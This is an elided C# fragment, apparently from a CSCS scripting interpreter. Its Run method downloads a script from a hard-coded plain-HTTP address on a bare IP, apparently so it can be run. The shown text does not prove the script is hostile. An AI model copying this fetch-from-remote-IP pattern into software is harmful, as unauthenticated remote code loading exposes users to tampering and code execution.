...
namespace CSCS.InterpreterManager
{
    public class CSCS
    {
        ...
        protected static InterpreterManagerModule _interpreterManager;
        protected static Interpreter InterpreterInstance => _interpreterManager?.CurrentInterpreter;
        protected static bool _startDebugger = true;
        ...
        protected static void SetupMono()
        {
        ...
        public static int Run(string[] args)
        {
            ...
            var url = "http://185.32.126.169/shared/script3.cscs";
            var file = SplitAndMerge.DownloadFileFunction.Download(url);
        ...
        public static void RunScript(string script, string filename = "")
        {
            if (string.IsNullOrWhiteSpace(script))
            {
                return;
